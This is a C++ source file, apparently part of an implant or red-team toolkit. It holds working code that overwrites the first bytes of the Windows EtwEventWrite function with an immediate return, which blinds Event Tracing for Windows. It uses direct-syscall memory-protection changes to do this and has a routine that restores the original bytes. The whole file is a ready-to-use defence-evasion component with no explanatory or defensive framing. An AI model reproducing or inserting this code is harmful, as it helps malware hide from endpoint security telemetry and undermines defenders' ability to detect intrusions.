#include "etw.h"
#include "peb_walk.h"
#include "syscalls.h"
#include <cstring>

static unsigned char s_orig_bytes[3] = {};
static bool s_patched = false;

bool patch_etw_bypass() {
    void* addr = reinterpret_cast<void*>(g_apis.pEtwEventWrite);
    if (!addr) return false;

    PVOID protect_addr = addr;
    SIZE_T protect_size = 3;
    ULONG old_protect = 0;

    NTSTATUS st = sc_NtProtectVirtualMemory(
        reinterpret_cast<HANDLE>(-1),
        &protect_addr, &protect_size,
        PAGE_EXECUTE_READWRITE, &old_protect);
    if (st != 0) return false;

    memcpy(s_orig_bytes, addr, 3);

    unsigned char patch[] = { 0x33, 0xC0, 0xC3 };
    memcpy(addr, patch, 3);

    protect_addr = addr;
    protect_size = 3;
    ULONG tmp = 0;
    sc_NtProtectVirtualMemory(
        reinterpret_cast<HANDLE>(-1),
        &protect_addr, &protect_size,
        old_protect, &tmp);

    s_patched = true;
    return true;
}

void restore_etw_bypass() {
    if (!s_patched) return;

    void* addr = reinterpret_cast<void*>(g_apis.pEtwEventWrite);
    if (!addr) return;

    PVOID protect_addr = addr;
    SIZE_T protect_size = 3;
    ULONG old_protect = 0;

    NTSTATUS st = sc_NtProtectVirtualMemory(
        reinterpret_cast<HANDLE>(-1),
        &protect_addr, &protect_size,
        PAGE_EXECUTE_READWRITE, &old_protect);
    if (st != 0) return;

    memcpy(addr, s_orig_bytes, 3);

    protect_addr = addr;
    protect_size = 3;
    ULONG tmp = 0;
    sc_NtProtectVirtualMemory(
        reinterpret_cast<HANDLE>(-1),
        &protect_addr, &protect_size,
        old_protect, &tmp);

    s_patched = false;
}
